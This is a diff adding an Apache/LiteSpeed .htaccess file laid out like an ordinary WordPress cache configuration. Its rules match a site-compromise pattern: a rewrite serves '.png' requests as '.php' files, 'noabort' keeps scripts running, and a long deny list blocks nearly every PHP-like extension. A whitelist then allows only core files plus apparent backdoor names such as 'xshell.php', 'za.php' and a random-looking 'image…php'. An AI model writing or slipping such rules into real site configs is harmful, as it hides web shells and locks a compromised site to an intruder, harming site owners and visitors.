@@ -1,0 +1,39 @@
+# BEGIN LSCACHE
+# END LSCACHE
+# BEGIN NON_LSCACHE
+# END NON_LSCACHE
+# BEGIN WordPress
+# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule ^(.+).png$ $1.php [L,QSA]
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+# END WordPress
+
+# BEGIN LiteSpeed
+# The directives (lines) between "BEGIN LiteSpeed" and "END LiteSpeed" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule Litespeed>
+SetEnv noabort 1
+</IfModule>
+
+
+<FilesMatch ".(PhP|phP|PHP1|PHP2|PHP3|PHP4|pHP|Php|php|pHP|PHP|pHp|PHp|pHp|phtml|PhTmL|pHtML|phtmL|PHTML|php.php.php.php.php.php|php.php.phtml|PHTML.phtml|pht|Pht|pHt|phT|pHT|PHt|PHT|php11|php12|php.test|suspected|php.suspected|php10|php11|php56|php.php.php|php.phtml|php.php.php.php.php|Php|pHp|phhP|pht|PHT|php.J|PHP|PhP|php1|php2|php4|php5|PHP5|PhP5|php6|php7|php8|php9|PHTML|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phtml|php|php5|php3|php|php7|Php7|pHp7|phP7|php5|pHp56|phar|Phar|pHar|phAr|phaR|PHar|pHAr|phAR|PHar|PHAR|pHAR|PaHAR|PHaR|PHAr|pHAR|PhP|php|phtml|PhTmL|pHtML|phtmL|PHTML|php.php.php.php.php.php|php.php.phtml|PHTML.phtml|pht|Pht|pHt|phT|pHT|PHt|PHT|php11|php12|php.test|suspected|php.suspected|php10|php11|php56|php.php.php|php.phtml|php.php.php.php.php|Php|pHp|phhP|pht|PHT|php.J|PHP|PhP|php1|php2|php4|php5|PHP5|PhP5|php6|php7|php8|php9|PHTML|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|shtml|sHtml|shTml|ShtMl|shtmL|SHtml|SHTml|ShTmL|SHTML|sHtmL)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|green.php|jquery.php|query.php|composer.php|wp-login.php|wp-config.php|wp-blog-header.php|za.php|xshell.php|page-404.php|wp-page-footer.php|query.php|image643800d4d7a9b1681391829.php|jquery-404.php|composer-404.php|infrastructure.php|current-offers.php|technical.php|paymentqr.php|clientarea.php|emailfeatures.php|customize.php|edit-comments.php|edit-tags.php|edit.php|checkbox.php|export.php|input.php|link.php|load-scripts.php|load-styles.php|dropdown.php|menu.php|nav-menus.php|network.php|options-discussion.php|options-general.php|options-permalink.php|options-privacy.php|options-reading.php|options-writing.php|plugins.php|post-new.php|post.php|privacy.php|profile.php|site-health.php|term.php|text.php|themes.php|tools.php|update-core.php|user-edit.php|user-new.php|users.php|wp-links.php|wp-login.php|wp-signup.php)$">#
+Order allow,deny
+Allow from all
+</FilesMatch>
+# END LiteSpeed
